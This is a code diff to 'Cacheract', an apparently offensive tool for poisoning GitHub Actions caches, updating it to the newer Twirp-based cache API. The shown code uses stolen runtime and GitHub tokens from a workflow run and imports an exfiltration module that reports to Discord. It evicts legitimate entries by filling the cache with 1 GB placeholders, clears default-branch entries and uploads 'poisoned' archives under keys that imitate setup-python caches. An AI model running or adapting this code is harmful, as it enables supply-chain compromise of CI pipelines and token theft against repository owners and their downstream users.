@@ -8,22 +8,24 @@ import { reportDiscord } from './exfil';
 import * as path from 'path';
 import { calculateCacheConfigs, calculateCacheVersion, getSetupActions, getWorkflows } from './cache_predictor';
 import { getCacheDirectories, getPackageManagerInfo } from './cache_predictor/node';
+import { FinalizeCacheEntryUploadRequest, FinalizeCacheEntryUploadResponse, CreateCacheEntryRequest } from '@actions/cache/lib/generated/results/api/v1/cache';
+import { UploadOptions } from '@actions/cache/lib/options';
 
-var cacheHttpclient = require('@actions/cache/lib/internal/cacheHttpClient');
+var cacheTwirpClient = require('@actions/cache/lib/internal/shared/cacheTwirpClient');
+var cacheHttpClient = require('@actions/cache/lib/internal/cacheHttpClient');
 /**
  * Set a cache entry
  * @param archive - Path to the archive file
  * @param key - Cache key
  * @param version - Cache version
  * @param runtimeToken - GitHub Actions runtime token
- * @param cacheUrl - URL for the cache service
  * @returns Promise<boolean> indicating if the cache entry was set successfully
  */
-async function setEntry(archive: string, key: string, version: string, runtimeToken: string, cacheUrl: string): Promise<boolean> {
+async function setEntry(archive: string, key: string, version: string, runtimeToken: string): Promise<boolean> {
     try {
         // Validate inputs
-        if (!cacheUrl || !runtimeToken) {
-            console.error('Cache URL or runtime token is missing');
+        if (!runtimeToken) {
+            console.error('Runtime token is missing');
             return false;
         }
 
@@ -36,29 +38,46 @@ async function setEntry(archive: string, key: string, version: string, runtimeTo
         const stats = fs.statSync(archive);
         const archiveFileSize = stats.size;
 
-        const headers = {
-            'Authorization': `Bearer ${runtimeToken}`,
-            'User-Agent': 'actions/cache-4.0.0',
-            'accept': 'application/json;api-version=6.0-preview.1'
-        };
-
-        const data = {
+        const request: CreateCacheEntryRequest = {
             key,
-            version,
-            cacheSize: archiveFileSize
-        };
+            version
+        }
 
-        const url = new URL(`${cacheUrl}_apis/artifactcache/caches`);
-        const response = await axios.post(url.href, data, { headers });
+        process.env['ACTIONS_RESULTS_URL'] = 'https://results-receiver.actions.githubusercontent.com';
+        process.env['ACTIONS_RUNTIME_TOKEN'] = runtimeToken;
 
-        if (response.status === 201) {
-            await cacheHttpclient.saveCache(response.data['cacheId'], archive);
-            return true;
+        const twirpClient = cacheTwirpClient.internalCacheTwirpClient();
+
+        const response = await twirpClient.CreateCacheEntry(request);
+
+        const options: UploadOptions = {
+            useAzureSdk: true
+        }
+
+        if (response.ok) {
+            await cacheHttpClient.saveCache(-1, archive, response.signedUploadUrl, options);
+            console.log('Cache entry created successfully:', response.data);
+
+            const finalizeRequest: FinalizeCacheEntryUploadRequest = {
+                key,
+                version,
+                sizeBytes: `${archiveFileSize}`
+            }
+
+            const finalizeResponse: FinalizeCacheEntryUploadResponse = await twirpClient.FinalizeCacheEntryUpload(finalizeRequest);
+
+            if (finalizeResponse.ok) {
+                console.log('Cache entry finalized successfully!');
+                return true;
+            } else {
+                console.error('Error finalizing cache entry');
+                return false;
+            }
         } else {
             console.log('Error saving cache entry:', response.status, response.statusText);
             return false;
         }
-    } catch (error) {
+      } catch (error) {
         console.error('Error setting cache entry:', error);
         return false;
     }
@@ -182,15 +201,14 @@ async function createEntry(size: number): Promise<string> {
 async function createAndSetEntry(
     size: number,
     key: string,
-    version: string,
-    accessToken: string,
-    cacheServerUrl: string
+    version: string, 
+    accessToken: string
 ) {
     const path = await createEntry(size);
     if (path) {
         const status = await updateEntry(path);
         if (status) {
-            await setEntry(path, key, version, accessToken, cacheServerUrl);
+            await setEntry(path, key, version, accessToken);
         } else {
             console.error("Failed to poison archive!");
         }
@@ -214,7 +232,6 @@ async function main() {
 
     const tokens = await getToken();
     const accessToken = tokens.get('ACCESS_TOKEN');
-    const cacheServerUrl = tokens.get('ACTIONS_CACHE_URL');
     const githubToken = tokens.get('GITHUB_TOKEN');
 
     console.log("Running 🧊 Cacheract 🧊 in verbose development mode!")
@@ -235,8 +252,7 @@ async function main() {
         await sleep(SLEEP_TIMER * 1000);
     }
 
-    if (githubToken && accessToken && cacheServerUrl) {
-        process.env['ACTIONS_CACHE_URL'] = cacheServerUrl;
+    if (githubToken && accessToken) {
         process.env['ACCESS_TOKEN'] = accessToken;
         process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;
 
@@ -248,11 +264,11 @@ async function main() {
     // Fill the cache with some data - if specified
     if (!isInfected() && FILL_CACHE > 0) {
         for (let i = 0; i < FILL_CACHE; i++) {
-            await createAndSetEntry(1000000000, "setup-python-Linux-24.04-Ubuntu-python-", `"CACHERACT${i}"`, accessToken, cacheServerUrl);
+            await createAndSetEntry(1000000000, "setup-python-Linux-24.04-Ubuntu-python-", `"CACHERACT${i}"`, accessToken);
         }
     }
 
-    if (githubToken && accessToken && cacheServerUrl && await isDefaultBranch(githubToken)) {
+    if (githubToken && accessToken && await isDefaultBranch(githubToken)) {
         const entries = await listCacheEntries(githubToken);
         let clearEntryFailed = false;
         try {
@@ -306,7 +322,7 @@ async function main() {
                             continue;
                         } else {
                             console.log("Attempting to update entry in main that is currently only in a feature branch or a custom entry.");
-                            await createAndSetEntry(size, key, version, accessToken, cacheServerUrl);
+                            await createAndSetEntry(size, key, version, accessToken);
                             continue;
                         }
                     }
@@ -318,7 +334,7 @@ async function main() {
                         path = await createEntry(size);
                     } else if (!version.includes("CACHERACT")) {
                         // Entry is in default branch, retrieve it
-                        path = await retrieveEntry(key, version, accessToken, cacheServerUrl);
+                        path = await retrieveEntry(key, version, accessToken);
 
                         if (!path) {
                             console.log(`Failed to retrieve cache entry ${key}!`);
@@ -343,7 +359,7 @@ async function main() {
                         // If we cleared the entry or if the entry was on feature branch then we set it.
                         if (cleared || currBranch !== ref) {
                             console.log(`Setting entry for key ${key}`);
-                            await setEntry(path, key, version, accessToken, cacheServerUrl);
+                            await setEntry(path, key, version, accessToken);
                         }
                     } else {
                         console.log("Failed to poison archive!");
